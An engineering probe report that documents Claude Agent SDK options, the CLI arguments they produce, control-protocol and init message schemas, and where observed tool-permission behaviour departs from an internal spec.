375e53220773a12f0a2a7a666740f7fb20d31b2989b250e4076957d026b5d6ac  /root/.claude/settings.json
375e53220773a12f0a2a7a666740f7fb20d31b2989b250e4076957d026b5d6ac  /root/.claude/settings.json
375e53220773a12f0a2a7a666740f7fb20d31b2989b250e4076957d026b5d6ac  /root/.claude/settings.json
```

No `~/.claude.json` or user settings were edited. Every `CLAUDE*`/`ANTHROPIC*`/`AI_AGENT` variable inherited from the
calling Claude Code session was deleted before the CLI was spawned. Every throwaway settings file had
`"enabledPlugins": {"cc10x@cc10x": false}`, and **cc10x did not register or fire**. The SDK runs report `"plugins": []` in every
`system/init`. The stdio run's debug log says:

```text
2026-09-14T16:14:50.086Z [DEBUG] Read hooks.json for plugin cc10x (enabled=false; will NOT register, plugin is disabled): /root/src/cc10x-qa/plugins/cc10x/hooks/hooks.json
2026-09-14T16:14:50.114Z [DEBUG] Found 1 plugins (0 enabled, 1 disabled)
...
2026-09-14T16:14:50.118Z [DEBUG] Registered 0 hooks from 0 plugins
```

Claude Code wrote its own transcripts for these throwaway sessions under `~/.claude/projects/-tmp-shp-sdk-*` and `-tmp-shp-mcp-*`.
The only directory removed was one this probe had created (`-tmp-shp-sdk-9IOKNs-work-resume-other-cwd-a`), deleted before its scenario was re-run.
No user transcript was read. No process this probe did not start was signalled.

---

### Agent SDK package and its bundled CLI

- **Produced by:** `pip install claude-agent-sdk` → claude-agent-sdk 0.2.152 (mcp 2.2.0, anyio 4.15.1), bundling Claude Code 2.1.259
- **Consumed by:** §5 Stack (spec line 406), §6 `MasterRuntime` / `AgentSDKMaster`, §11 Master configuration, §15 Packaging; D10, D30; M4
- **Probe:** `docs/probes/2026-09-14-schemas/agent-sdk-mcp/introspect_sdk.py`. Re-run: `<venv>/bin/python docs/probes/2026-09-14-schemas/agent-sdk-mcp/introspect_sdk.py docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/introspect`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/introspect/sdk-install.txt`, plus `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/pip-freeze.txt`)

```text
python: 3.12.3 (main, Aug 31 2026, 10:18:26) [GCC 13.3.0]
sys.executable: /tmp/shp-sdk-9IOKNs/venv/bin/python
claude-agent-sdk==0.2.152
mcp==2.2.0
mcp-types==2.2.0
anyio==4.15.1
pydantic==2.13.5
claude_agent_sdk.__version__ = 0.2.152
bundled __cli_version__ = 2.1.259
bundled binary: /tmp/shp-sdk-9IOKNs/venv/lib/python3.12/site-packages/claude_agent_sdk/_bundled/claude exists=True size=216677784
bundled `claude --version`: 2.1.259 (Claude Code)
PATH `claude --version`: 2.1.270 (Claude Code)
__all__ = ["AgentDefinition", "AssistantMessage", "BaseHookInput", "CLIConnectionError", "CLIJSONDecodeError", "CLINotFoundError", "CanUseTool", "CanUseToolShad...
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `claude_agent_sdk.__version__` | str | always | `0.2.152` | |
| `_cli_version.__cli_version__` | str | always | `2.1.259` | version of the bundled binary |
| `claude_agent_sdk/_bundled/claude` | ELF, 216,677,784 bytes | always (Linux wheel) | 2.1.259 | the package is 208 MB on disk |
| `SubprocessCLITransport._find_cli()` order | — | — | bundled → `shutil.which("claude")` → `~/.npm-global/bin`, `/usr/local/bin`, `~/.local/bin`, … | `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/introspect/internals-source.txt`; the bundled CLI always wins unless `cli_path=` is passed |

**Variants and edge cases:**
- The SDK spawns **its own** Claude Code, not the one on PATH. It was 2.1.259 here, while the tier-2 sessions use 2.1.270. `cli_path="/root/.local/bin/claude"` switches it; the `locked-syscli` run shows the same config working on 2.1.270.
- The transport always sets `CLAUDE_CODE_ENTRYPOINT=sdk-py` and `CLAUDE_AGENT_SDK_VERSION`, and removes `CLAUDECODE` from the child env (`docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/introspect/internals-source.txt`, `SubprocessCLITransport.connect`).
- On this host, python3 has no `ensurepip`, so the venv needs `--without-pip` plus `get-pip.py` (`docs/probes/2026-09-14-schemas/agent-sdk-mcp/run_all.sh`). That is relevant to §15 packaging.

**Spec alignment:**
- Gap, not a contradiction: spec line 406 lists `claude-agent-sdk` as a backend dependency but does not say the package ships a second Claude Code binary. In reality the master runs the bundled 2.1.259, and it will drift from the fleet's `claude` unless `AgentSDKMaster` pins `cli_path` (`docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/introspect/sdk-install.txt`, `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/locked/meta.json` vs `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/locked-syscli/meta.json`).

---

### `ClaudeAgentOptions` (as installed)

- **Produced by:** claude-agent-sdk 0.2.152, `claude_agent_sdk/types.py:1940`
- **Consumed by:** §11 Master configuration (spec lines 1525–1537), §6 `MasterRuntime.configure/resume`; D10, D19, D20, D30, D32; M4
- **Probe:** `docs/probes/2026-09-14-schemas/agent-sdk-mcp/introspect_sdk.py` → `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/introspect/options-signature.txt`, `options-source.txt`. The CLI argv each option produces is in `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/<scenario>/meta.json`. Re-run: as above, plus `<venv>/bin/python docs/probes/2026-09-14-schemas/agent-sdk-mcp/master_probe.py locked docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures <tmpdir>`
- **Status:** verified live 2026-09-14 (signature from the installed source; the option→argv mapping and the behaviour of `tools`, `allowed_tools`, `disallowed_tools`, `setting_sources`, `strict_mcp_config`, `can_use_tool`, `resume`, `fork_session`, `cwd`, `settings`, `hooks`, `include_partial_messages`, `max_turns` and `cli_path` were exercised live)

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/introspect/options-signature.txt`)

```text
dataclasses.fields:
  tools: list[str] | claude_agent_sdk.types.ToolsPreset | None  = None
  allowed_tools: list[str]  = 'factory:list'
  system_prompt: str | claude_agent_sdk.types.SystemPromptPreset | claude_agent_sdk.types.SystemPromptFile | None  = None
  mcp_servers: dict[str, claude_agent_sdk.types.McpStdioServerConfig | claude_agent_sdk.types.McpSSEServerConfig | claude_agent_sdk.types.McpHttpServerConfig | claude_agent_sdk.types.McpSdkServerConfig] | str | pathlib.Path  = 'fa...
  strict_mcp_config: <class 'bool'>  = False
  permission_mode: typing.Optional[typing.Literal['default', 'acceptEdits', 'plan', 'bypassPermissions', 'dontAsk', 'auto']]  = None
...
  resume: str | None  = None
  session_id: str | None  = None
  max_turns: int | None  = None
...
  disallowed_tools: list[str]  = 'factory:list'
  model: str | None  = None
...
  cwd: str | pathlib.Path | None  = None
  cli_path: str | pathlib.Path | None  = None
  settings: str | None  = None
...
  env: dict[str, str]  = 'factory:dict'
...
  can_use_tool: collections.abc.Callable[[str, dict[str, typing.Any], claude_agent_sdk.types.ToolPermissionContext], collections.abc.Awaitable[claude_agent_sdk.types.PermissionResultAllow | claude_agent_sdk.types.PermissionResultD...
  hooks: dict[typing.Union[typing.Literal['PreToolUse'], typing.Literal['PostToolUse'], typing.Literal['PostToolUseFailure'], typing.Literal['UserPromptSubmit'], typing.Literal['Stop'], typing.Literal['SubagentStop'], typing.Liter...
...
  include_partial_messages: <class 'bool'>  = False
...
  fork_session: <class 'bool'>  = False
...
  setting_sources: list[typing.Literal['user', 'project', 'local']] | None  = None
  skills: typing.Union[list[str], typing.Literal['all'], NoneType]  = None
...
  effort: typing.Optional[typing.Literal['low', 'medium', 'high', 'xhigh', 'max']]  = None
```

The docstrings that decide the semantics (trimmed; full capture: `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/introspect/options-source.txt`):

```text
    tools: list[str] | ToolsPreset | None = None
    """Specify the base set of available built-in tools.
...
    - ``[]`` (empty list) — Disable all built-in tools.
...
    allowed_tools: list[str] = field(default_factory=list)
    """Tool names that are auto-allowed without prompting for permission.
...
    To restrict which tools are available at all, use ``tools``.
...
    strict_mcp_config: bool = False
    """When ``True``, only use MCP servers passed via :attr:`mcp_servers`,
    ignoring all other MCP configurations the CLI would otherwise load (e.g.
...
    can_use_tool: CanUseTool | None = None
...
    it is the SDK replacement for the interactive permission prompt. It is *not*
    invoked for tool calls already permitted by ``allowed_tools``,
    ``permission_mode`` (e.g. ``"acceptEdits"`` / ``"bypassPermissions"``), or
    ``permissions.allow`` rules in settings, since those never reach a prompt.
...
    setting_sources: list[SettingSource] | None = None
```

The argv this becomes for the `locked` master (full capture: `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/locked/meta.json`):

```text
  "argv": [
    [
      "/tmp/shp-sdk-9IOKNs/venv/lib/python3.12/site-packages/claude_agent_sdk/_bundled/claude",
      "--output-format",
      "stream-json",
      "--verbose",
      "--system-prompt",
      "You are a probe orchestrator. Follow the user's instructions literally and briefly.",
      "--tools",
      "",
      "--allowedTools",
      "mcp__shepherd__fleet_summary,mcp__shepherd__spawn_session,mcp__shepherd__fail_tool,mcp__shepherd__raise_tool",
      "--max-turns",
      "14",
      "--disallowedTools",
      "Agent,Task",
      "--model",
      "claude-haiku-4-5-20251001",
      "--permission-prompt-tool",
      "stdio",
      "--settings",
      "/tmp/shp-sdk-9IOKNs/flag-settings.json",
      "--mcp-config",
      "{\"mcpServers\": {\"shepherd\": {\"type\": \"sdk\", \"name\": \"shepherd\"}}}",
      "--strict-mcp-config",
      "--setting-sources=",
      "--input-format",
      "stream-json"
    ]
  ],
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `tools` | `list[str] \| ToolsPreset \| None` | sometimes | `None` → no flag; `[]` → `--tools ""` | **the only option that removes built-in tools** |
| `allowed_tools` | `list[str]` | always (default `[]`) | `mcp__shepherd__…` | → `--allowedTools a,b`. **Auto-approve list, not an availability list** |
| `disallowed_tools` | `list[str]` | always (default `[]`) | `["Agent","Task"]` | → `--disallowedTools`. Removed `Agent` from `tools`; `TaskCreate/TaskGet/TaskList/TaskOutput/TaskStop/TaskUpdate` remain |
| `setting_sources` | `list["user","project","local"] \| None` | sometimes | `[]` → `--setting-sources=`; `None` → no flag | `None` loads everything (see the isolation schema) |
| `strict_mcp_config` | bool | always | `True` → `--strict-mcp-config` | drops the account's claude.ai connectors |
| `mcp_servers` | `dict[str, Stdio\|SSE\|Http\|Sdk config] \| str \| Path` | always | `{"shepherd": {"type":"sdk","name":"shepherd","instance":<Server>}}` | `instance` is stripped and the rest goes to `--mcp-config` as JSON |
| `can_use_tool` | `async (tool_name:str, input:dict, ToolPermissionContext) -> PermissionResultAllow\|PermissionResultDeny` | sometimes | probe callbacks | setting it adds `--permission-prompt-tool stdio` |
| `resume` / `fork_session` / `session_id` / `resume_session_at` | `str\|None` / bool / `str\|None` / `str\|None` | sometimes | uuid | `--resume=<id>`, `--fork-session` |
| `cwd` | `str\|Path\|None` | always | `None` (= process cwd) | also keys the transcript directory |
| `settings` | `str\|None` | sometimes | a file path | → `--settings` (flag layer, highest priority) |
| `permission_mode` | `default\|acceptEdits\|plan\|bypassPermissions\|dontAsk\|auto\|None` | never set by probe | init reported `"permissionMode": "default"` | |
| `effort`, `thinking`, `max_budget_usd`, `task_budget`, `session_store`, `skills`, `plugins`, `agents`, `output_format`, `sandbox` | see capture | never set by probe | — | present in 0.2.152; not exercised |

**Variants and edge cases:**
- When `can_use_tool` is set and `allowed_tools` names a whole tool, the SDK emits a warning at connect time (captured in `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/locked/meta.json`):

```text
    "CanUseToolShadowedWarning: can_use_tool will not be invoked for: mcp__shepherd__fleet_summary, mcp__shepherd__spawn_session, mcp__shepherd__fail_tool, mcp__shepherd__raise_tool. An allowed_tools entry that allows a whole tool auto-approves it before the callback is consulted. To gate every tool call, use a PreToolUse hook; or narrow the entry so calls fall through to can_use_tool. Allow rules...
```

- `system_prompt=None` still sends `--system-prompt ""`. A string replaces Claude Code's prompt entirely (`docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/introspect/internals-source.txt`, `_build_command`).
- `ClaudeSDKClient` has no `resume()` or `configure()` method. Resume and tool mounting are construction-time options, so each `resume` means a new CLI subprocess. Mid-session methods that exist: `interrupt`, `set_model`, `set_permission_mode`, `toggle_mcp_server(server_name, enabled)`, `reconnect_mcp_server`, `get_mcp_status`, `get_context_usage`, `stop_task`, `rewind_files` (`docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/introspect/client-api.txt`).

**Spec alignment:**
- Spec line 1540 says `allowed_tools` "stays a strict allowlist", and line 113 (D10) says "`allowed_tools` = orchestration MCP tools only". In reality `allowed_tools` only **auto-approves**. With the spec block as written, `system/init.tools` lists 32 built-ins (Bash, Read, Write, Edit, WebFetch, Skill, SendMessage, Workflow, …), plus 38 claude.ai connector tools (Gmail and Calendar are connected on this account), plus the 5 shepherd tools (`docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/basic/raw-stream.jsonl`). Restricting availability needs `tools=[]`, and dropping the account connectors additionally needs `strict_mcp_config=True` (`docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/tools_empty/`, `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/locked/`).
- Spec lines 1542–1543 say "The master still has no Read, Write, Edit, Bash, or WebFetch". In reality the `basic` master ran `Bash` `echo hi` with **no** `can_use_tool` call. The likely cause is that Claude Code auto-allows read-only Bash; this is inferred, not proven. The flag settings held only `enabledPlugins`, and `~/.claude/settings.json` has no `permissions` block (see "Built-in tools reachable from the spec-configured master" below).
- Spec line 1534 says `can_use_tool=authorize`. In reality the callback signature is `(tool_name: str, input: dict, ToolPermissionContext) -> PermissionResultAllow|PermissionResultDeny`, not `authorize(tool: ToolDef, args, ctx: CallerContext) -> Decision` (line 1728). It is **never invoked for tools listed in `allowed_tools`**: the SDK warns about exactly this, and `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/locked/can-use-tool.jsonl` has only the one tool that was *not* in `allowed_tools`. So either `authorize()` runs inside the exporter's handler (`invoke()`, line 1464), which is the D32 design and makes line 1534 redundant, or `allowed_tools` must be empty for the gate to see anything. (Only tools mounted from `SHEPHERD_TOOLS` but left out of `ORCHESTRATOR_TOOLS` at line 1530, and built-ins Claude Code does not auto-allow, would still reach the callback.)
- Gap, not a contradiction: spec line 1536 says `cwd=None  # it delegates; it does not edit`. The comment gives a reason; it does not claim that `cwd=None` removes tools (that claim is at lines 1542–1543, above). Still, `cwd=None` only means "the daemon's cwd". It does not remove editing tools (only `tools=[]` does), and it determines the `~/.claude/projects/<cwd-key>/` directory the master's transcript is written to.
- Spec line 1529 says `disallowed_tools=["Agent","Task"]`. That is aligned: no `Agent`/`Task` in `tools`. The subagent roster (`agents`: `claude, Explore, general-purpose, Plan, statusline-setup`) is still reported in `system/init`.

---

### Control protocol handshake (SDK ↔ CLI over stdio)

- **Produced by:** claude-agent-sdk 0.2.152 (request) / Claude Code 2.1.259 (response)
- **Consumed by:** `AgentSDKMaster` internals (§6, §11); D30 (seat), D32; M4
- **Probe:** `docs/probes/2026-09-14-schemas/agent-sdk-mcp/master_probe.py` (every scenario). Re-run: `<venv>/bin/python docs/probes/2026-09-14-schemas/agent-sdk-mcp/master_probe.py locked docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures <tmpdir>`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/locked/raw-stream.jsonl`)

```json
{"type": "control_request", "request_id": "req_1_9b098ea6", "request": {"subtype": "initialize", "hooks": {"PreToolUse": [{"matcher": null, "hookCallbackIds": ["hook_0"]}], "PostToolUse": [{"matcher": null, "hookCallbackIds": ["hook_1"]}], "PostToolUseFailure": [{"matcher": null, "hookCallbackIds": ["hook_2"]}]}}}
{"type": "control_response", "response": {"subtype": "success", "request_id": "req_1_9b098ea6", "response": {"commands": [{"name": "deep-research", "description": "Deep research harness \u2014 fan-out web searches, fetch sources, adversarially verify claims, ...", "argumentHint": ""}, "..."], "agents": [{"name": "claude", "description": "Catch-all for any task that doesn't fit a more specific agent. FleetView's default when no..."}, "..."], "...": "...", "models": [{"value": "default", "resolvedModel": "claude-opus-5[1m]", "displayName": "Default (recommended)", "description": "Opus 5 with 1M context \u00b7 Best for everyday, complex tasks", "supportsEffort": true, "supportedEffortLevels": ["low", "..."], "supportsAdaptiveThinking": true, "supportsFastMode": true, "supportsAutoMode": true}, "..."], "account": {"email": "<redacted>", "organization": "<redacted>", "subscriptionType": "Claude Max", "apiProvider": "firstParty"}, "pid": 4045135, "current_permission_mode": "default", "hooks_applied": true, "analytics_disabled": false, "...": "...", "remote_control_available": true, "...": "...", "session_state": "idle"}}}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `request.subtype` | str | always | `initialize` | first line the SDK writes |
| `request.hooks.<Event>[].hookCallbackIds` | list[str] | when `hooks=` set | `hook_0`, `hook_1`, `hook_2` | the CLI later calls these back with `hook_callback` |
| `response.response.commands[]` | list | always | 50 slash commands even with `setting_sources=[]` | bundled skills and commands |
| `response.response.models[]` | list | always | `value`, `resolvedModel`, `displayName`, `supportedEffortLevels`, … | the account's model menu (`ModelProvider.models()` candidate) |
| `response.response.account` | dict | always | `email`, `organization` (redacted), `subscriptionType: "Claude Max"`, `apiProvider: "firstParty"` | seat evidence for D30 |
| `response.response.pid` | int | always | CLI pid | |
| `response.response.remote_control_available` | bool | always | `true` | |

**Variants and edge cases:**
- Line framing: one JSON object per line on both pipes. The SDK's user turns go out as `{"type":"user","message":{"role":"user","content":"…"},"parent_tool_use_id":null,"session_id":"default"}` (`_dir:"out"` lines in any `raw-stream.jsonl`).
- Other control subtypes observed from CLI → SDK: `mcp_message`, `hook_callback`, `can_use_tool`, `control_cancel_request`. From SDK → CLI: `initialize`, `interrupt`. All are shown in the schemas below.

**Spec alignment:** aligned. The spec treats this layer as `AgentSDKMaster`'s business and does not describe it.

---

### `system/init` message (`SystemMessage(subtype="init")`)

- **Produced by:** Claude Code 2.1.259 (bundled) and 2.1.270 (`locked-syscli`, `stdio-mcp`)
- **Consumed by:** §6 `MasterCapabilities`, §11 Master configuration / Connectors (health), §18 isolation test; D10, D20, D30; M4
- **Probe:** `docs/probes/2026-09-14-schemas/agent-sdk-mcp/master_probe.py` (all scenarios), `docs/probes/2026-09-14-schemas/agent-sdk-mcp/stdio/run_stdio_probe.sh`. Re-run: see run_all.sh
- **Status:** verified live 2026-09-14 (19 init messages across 12 runs)

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/locked/raw-stream.jsonl`)

```json
{"type": "system", "subtype": "init", "cwd": "/tmp/shp-sdk-9IOKNs/work-locked", "session_id": "15014424-acaa-4260-976f-1c7d410304c9", "tools": ["mcp__shepherd__fail_tool", "mcp__shepherd__fleet_summary", "mcp__shepherd__kill_session", "..."], "mcp_servers": [{"name": "shepherd", "status": "connected"}], "model": "claude-haiku-4-5-20251001", "permissionMode": "default", "slash_commands": ["deep-research", "design-sync", "dataviz", "..."], "terminal_slash_commands": ["doctor", "color"], "apiKeySource": "none", "claude_code_version": "2.1.259", "output_style": "default", "agents": ["claude", "Explore", "general-purpose", "..."], "skills": ["deep-research", "design-sync", "dataviz", "..."], "plugins": [], "capabilities": ["interrupt_receipt_v1", "interrupt_cancel_queued_v1", "msg_lifecycle_v1"], "analytics_disabled": false, "product_feedback_disabled": false, "uuid": "df5960b8-e361-42ae-80f8-1ee7b6cbd5c2", "memory_paths": {"auto": "/root/.claude/projects/-tmp-shp-sdk-9IOKNs-work-locked/memory/"}, "messaging_socket_path": "/run/user/0/cc-socks/4045135.sock", "fast_mode_state": "off", "fast_mode_disabled_reason": "sdk_opt_in_required"}
```

The same message for the spec's option block as written (`basic`; full capture: `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/basic/raw-stream.jsonl`):

```json
{"type": "system", "subtype": "init", "...": "...", "tools": ["AskUserQuestion", "Bash", "CronCreate", "CronDelete", "CronList", "DesignSync", "Edit", "EnterPlanMode", "EnterWorktree", "ExitPlanMode", "ExitWorktree", "ListAgents", "Monitor", "NotebookEdit", "PushNotification", "Read", "RemoteTrigger", "ReportFindings", "ScheduleWakeup", "SendMessage", "Skill", "TaskCreate", "TaskGet", "TaskList", "TaskOutput", "TaskStop", "TaskUpdate", "ToolSearch", "WebFetch", "WebSearch", "Workflow", "Write", "mcp__claude_ai_Gmail__apply_sensitive_message_label", "...", "mcp__shepherd__fail_tool", "mcp__shepherd__fleet_summary", "mcp__shepherd__kill_session", "mcp__shepherd__raise_tool", "mcp__shepherd__spawn_session"], "mcp_servers": [{"name": "claude.ai Google Drive", "status": "needs-auth"}, {"name": "claude.ai Slack", "status": "needs-auth"}, {"name": "claude.ai Notion", "status": "needs-auth"}, {"name": "claude.ai Google Calendar", "status": "connected"}, {"name": "claude.ai Atlassian Rovo", "status": "needs-auth"}, {"name": "claude.ai Gmail", "status": "connected"}, {"name": "shepherd", "status": "connected"}], "...": "...", "apiKeySource": "none", "...": "...", "plugins": [], "...": "..."}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `session_id` | str (uuid) | always | | the id to persist for `resume` |
| `tools` | list[str] | always | 5 (locked) … 75 (basic) | the definitive "what can the master call" list |
| `mcp_servers[]` | list[{name,status}] | always | `connected`, `needs-auth` | account connectors appear as `claude.ai <Name>` unless `strict_mcp_config` |
| `apiKeySource` | str | always | `none` | no API key in env; the seat was used |
| `claude_code_version` | str | always | `2.1.259`, `2.1.270` | |
| `model` | str | always | `claude-haiku-4-5-20251001` | |
| `permissionMode` | str | always | `default` | |
| `plugins` | list | always | `[]` | cc10x disabled by the flag settings |
| `skills` / `slash_commands` | list[str] | always | 17 / 50 | present even with `setting_sources=[]` and `tools=[]` |
| `agents` | list[str] | always | `claude, Explore, general-purpose, Plan, statusline-setup` | |
| `capabilities` | list[str] | always | `interrupt_receipt_v1`, `interrupt_cancel_queued_v1`, `msg_lifecycle_v1` | |
| `memory_paths.auto` | str | always | `~/.claude/projects/<cwd-key>/memory/` | |
| `messaging_socket_path` | str | always | `/run/user/0/cc-socks/<pid>.sock` | every SDK-spawned CLI opens one |
| `cwd`, `output_style`, `terminal_slash_commands`, `analytics_disabled`, `product_feedback_disabled`, `fast_mode_state`, `fast_mode_disabled_reason`, `uuid` | | always | `fast_mode_disabled_reason: "sdk_opt_in_required"` | |

**Variants and edge cases:**
- A `system/init` is emitted **per turn**, not once per connection: the `interrupt` scenario has two, with the same `session_id`.
- `messaging_socket_path` means the master is itself a peer on the local messaging socket. Whether other sessions can address it was not probed.

**Spec alignment:**
- Spec line 1528 comments `setting_sources=[]` as "no CLAUDE.md, no cc10x, no skills". In reality `skills` has 17 entries and a `skill_listing` attachment is injected into the master's context. All 17 are skills bundled with Claude Code (`deep-research`, `dataviz`, `code-review`, `loop`, …). No user or plugin skill appeared, but the cc10x plugin was also disabled by flag settings, so that exclusion is not isolated. Project `CLAUDE.md` *is* excluded. See the isolation schema (`docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/locked/raw-stream.jsonl`, `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/resume/transcript-*.jsonl`).
- Spec §11 Connectors rule 4 (lines 1600–1603) says health is polled. `system/init.mcp_servers[].status` and `ClaudeSDKClient.get_mcp_status()` are the SDK-side sources (`docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/introspect/client-api.txt`). Polling is not probed.

---

### `AssistantMessage` and its content blocks

- **Produced by:** Claude Code 2.1.259 stream-json → parsed by claude-agent-sdk 0.2.152
- **Consumed by:** §6 `MasterRuntime.send() -> AsyncIterator[Event]`, §12 Chat page; D30; M4
- **Probe:** `master_probe.py locked` (and all others). Re-run: as above
- **Status:** verified live 2026-09-14 (135 assistant objects; `text`, `thinking` and `tool_use` blocks seen. `ServerToolUseBlock`/`ServerToolResultBlock` are not observed)

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/locked/raw-stream.jsonl`)

```json
{"type": "assistant", "message": {"model": "claude-haiku-4-5-20251001", "id": "msg_011Cf3ckNHZssSyZTFkaHLFL", "type": "message", "role": "assistant", "content": [{"type": "thinking", "thinking": "", "signature": "EoQHCrIBCBEYAipAyHNEJCwDQjsYH2xXHaVSsP06ht46PFO0c9Qdx1DfzMm7..."}], "container": null, "stop_reason": null, "stop_sequence": null, "stop_details": null, "usage": {"input_tokens": 1488, "cache_creation_input_tokens": 0, "cache_read_input_tokens": 0, "...": "...", "output_tokens": 3, "service_tier": "standard", "...": "..."}, "diagnostics": null, "context_management": null}, "parent_tool_use_id": null, "session_id": "15014424-acaa-4260-976f-1c7d410304c9", "uuid": "c5473659-b8a3-4b17-9960-a3dcdca30139", "timestamp": "2026-09-14T16:05:25.311Z", "request_id": "req_011Cf3ckMo4DB2bT48CVxwJh"}
{"type": "assistant", "message": {"model": "claude-haiku-4-5-20251001", "id": "msg_011Cf3ckNHZssSyZTFkaHLFL", "type": "message", "role": "assistant", "content": [{"type": "text", "text": "I'll execute these steps in order, one at a time.\n\n**Step 1:..."}], "container": null, "stop_reason": null, "stop_sequence": null, "stop_details": null, "usage": {"input_tokens": 1488, "cache_creation_input_tokens": 0, "cache_read_input_tokens": 0, "...": "...", "output_tokens": 3, "service_tier": "standard", "...": "..."}, "diagnostics": null, "context_management": null}, "parent_tool_use_id": null, "session_id": "15014424-acaa-4260-976f-1c7d410304c9", "uuid": "f5b93b58-413f-445f-86c5-4764261d738a", "timestamp": "2026-09-14T16:05:25.518Z", "request_id": "req_011Cf3ckMo4DB2bT48CVxwJh"}
{"type": "assistant", "message": {"model": "claude-haiku-4-5-20251001", "id": "msg_011Cf3ckcrBdsdaV3aCbSiCW", "type": "message", "role": "assistant", "content": [{"type": "tool_use", "id": "toolu_01VcYQNKad4ejYQGSP4eZ3ov", "name": "mcp__shepherd__kill_session", "input": {"id": "ses_a1"}, "caller": {"type": "direct"}}], "container": null, "stop_reason": null, "stop_sequence": null, "stop_details": null, "usage": {"input_tokens": 1975, "cache_creation_input_tokens": 0, "cache_read_input_tokens": 0, "...": "...", "output_tokens": 8, "service_tier": "standard", "...": "..."}, "diagnostics": null, "context_management": null}, "parent_tool_use_id": null, "session_id": "15014424-acaa-4260-976f-1c7d410304c9", "uuid": "7f544a12-9897-45ef-b829-248ea4af579a", "timestamp": "2026-09-14T16:05:27.989Z", "request_id": "req_011Cf3ckcNtpqVt9B3d6ZTpt", "tool_use_meta": [{"id": "toolu_01VcYQNKad4ejYQGSP4eZ3ov", "display_name": "Kill Session", "server_display_name": "shepherd"}]}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `message.content[]` | list, **exactly one block per stream line** | always | `thinking` / `text` / `tool_use` | one API message arrives as several `assistant` lines sharing `message.id` |
| `content[].type=thinking` → `thinking`, `signature` | str | 52/135 | `thinking: ""` | observed only as an empty string with a signature |
| `content[].type=text` → `text` | str | 49/135 | | |
| `content[].type=tool_use` → `id`, `name`, `input`, `caller` | str, str, dict, dict | 34/135 | `name: "mcp__shepherd__kill_session"`, `caller: {"type":"direct"}` | |
| `message.stop_reason` | null | always null on the wire | | the real stop reason is only on `result.stop_reason` |
| `message.usage` | dict | always | per-message token counts | |
| `session_id`, `uuid`, `timestamp`, `request_id`, `parent_tool_use_id` | | always | | |
| `tool_use_meta[]` | list[{id, display_name, server_display_name}] | 32/135 | `"Kill Session"`, `"shepherd"` | |
| `wire_tool_inputs` | dict | 11/135 | | |
| `aborted` | bool | 1/135 | `true` | the block that was streaming when `interrupt()` landed |

**Variants and edge cases:**
- Parsed SDK class `AssistantMessage(content, model, parent_tool_use_id, error, usage, message_id, stop_reason, session_id, uuid)` drops `timestamp`, `request_id`, `tool_use_meta` (`docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/locked/messages.jsonl`). `TextBlock` is serialised without its `type` (dataclass has no such field).

**Spec alignment:** aligned. The spec leaves `Event` abstract. Note for `send()`: the tool name the model emits is the MCP-prefixed name, never the bare `ToolDef.name`.

---

### `UserMessage` carrying tool results

- **Produced by:** Claude Code 2.1.259 → claude-agent-sdk 0.2.152 `UserMessage`
- **Consumed by:** §6 `send()` events, §11 "The cap returns a tool error the agent can read" (line 1722), §11 `authorize()` denial message (line 1743); D8, D32; M4
- **Probe:** `master_probe.py locked` and `deny`. Re-run: as above
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full captures: `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/locked/raw-stream.jsonl`, `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/deny/raw-stream.jsonl`). The five lines are: success, handler `is_error`, handler raised, schema validation failed, and `can_use_tool` denied.

```json
{"type": "user", "message": {"role": "user", "content": [{"tool_use_id": "toolu_01VcYQNKad4ejYQGSP4eZ3ov", "type": "tool_result", "content": [{"type": "text", "text": "killed ses_a1"}]}]}, "parent_tool_use_id": null, "session_id": "15014424-acaa-4260-976f-1c7d410304c9", "uuid": "8c817b6b-78d8-4a76-83b7-f0f46a2b56fc", "timestamp": "2026-09-14T16:05:28.026Z", "tool_use_result": [{"type": "text", "text": "killed ses_a1"}]}
{"type": "user", "message": {"role": "user", "content": [{"type": "tool_result", "content": "max_children_per_session=5 reached", "is_error": true, "tool_use_id": "toolu_012FdXhQgMDRg25WPkfmz7iw"}]}, "parent_tool_use_id": null, "session_id": "15014424-acaa-4260-976f-1c7d410304c9", "uuid": "7f08c489-2a2f-409c-b9d2-7424e879d08c", "timestamp": "2026-09-14T16:05:29.089Z", "tool_use_result": "Error: max_children_per_session=5 reached"}
